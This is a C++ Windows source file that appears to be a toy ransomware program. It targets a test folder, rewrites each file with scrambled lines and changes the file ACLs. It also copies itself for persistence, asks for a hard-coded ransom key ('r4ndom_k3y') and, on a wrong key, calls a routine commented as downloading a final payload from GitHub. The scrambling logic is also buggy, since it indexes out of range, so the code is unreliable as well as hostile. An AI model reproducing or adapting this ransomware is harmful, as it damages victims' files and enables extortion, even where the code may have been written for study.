#ifndef UNICODE
#define UNICODE
#define UNICODE_WAS_UNDEFINED
#endif

#include <Windows.h>

#ifdef UNICODE_WAS_UNDEFINED
#undef UNICODE
#endif

#include <AccCtrl.h>
#include <AclAPI.h>
#include <tchar.h>
#include <cstring>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <locale> 
#include <codecvt>

#include "kill_switch.h"
#include "misc.h"

using namespace std;

Misc misc;

// string to wstring conversion
wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

// wstring to string conversion
string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}

void SetFilePermission(LPCWSTR filename)
{
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	// create a well-known SID for the everyone group
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);

	// initialize an EXPLICIT_ACCESS structure for ACE
	ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = SPECIFIC_RIGHTS_ALL;
	ea[0].grfAccessMode = GRANT_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPCH)pEveryoneSID;

	// Create a new ACL that contains the new ACEs
	SetEntriesInAcl(1, ea, NULL, &pACL);

	// Initialize a security descriptor
	PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

	// Add the ACL to the security descriptor 
	SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE); // not a default DACL

	// Change the security attributes
	SetFileSecurity(filename, DACL_SECURITY_INFORMATION, pSD);

	if (pEveryoneSID)
	{
		FreeSid(pEveryoneSID);
	}
	if (pACL)
	{
		LocalFree(pACL);
	}
	if (pSD)
	{
		LocalFree(pSD);
	}
}

vector<wstring> list_n_kill_files(wstring path)
{
	vector<wstring> subdirs, matches;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			wstring filename = _T(ffd.cFileName);
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				wstring file_path = path + L"\\" + filename;
				matches.push_back(file_path);

				std::wcout << "Opening contents of " << filename << std::endl;

				// open file for writing
				std::ofstream outfile;
				if (outfile.fail())
				{
					std::wcout << "Can't open file " << filename << "!" << std::endl;
				}
				else {
					string readout;
					string replace;

					std::cout << "Writing to file..." << std::endl;
					// for read
					ifstream file_read(file_path);
					// for write
					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
					while (getline(file_read, readout))
					{
						std::cout << "Replacing line..." << std::endl;
						std::cout << readout << std::endl << std::endl;
						// replace each letter of word in file
						for (int i = 0; i < readout.length() + 1; i++)
						{
							// shift letters up one, power up 3
							replace += readout[i + 1 ^ 3];
						}
						// append replaced strings to file
						outfile << replace + "\n";
						replace.clear();
					}
					// set file permissions to admin if not admin : lock
					SetFilePermission(file_path.c_str());

					// close files
					file_read.close();
					outfile.close();
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
	}
	else {
		std::cout << "Can't find files in directory" << std::endl;
	}
	FindClose(hFind);
	return matches;
}

int main()
{
	string fake_key;

	string attack_dir = misc.current_working_directory() + "/../../test_attack_folder";
	vector<wstring> files = list_n_kill_files(s2ws(attack_dir));
	string res = ws2s((const std::wstring&)*files.data()); // convert files vector into wstring into string
	
	// if files contain the string txt, exploit was completed
	if (res.find("txt") != std::string::npos)
	{
		std::cout << "[+] Exploit completed" << std::endl << std::endl;

		// Start persistance 
		misc.CopyMyself();
	}

	std::cout << "[!] Enter key to decrypt files: " << std::endl;
	cin >> fake_key;
	const char* key = fake_key.c_str();

	if (strncmp("r4ndom_k3y", key, 10) == 0)
	{
		std::cout << "[+] Your files are being decrypted" << std::endl;
		decrypt_files(s2ws(attack_dir));
	}
	else {
		std::cout << "[-] Wrong Password" << std::endl;
		// download final payload from github
		misc.CallFileFromInternet();
	}

	return 0;
}

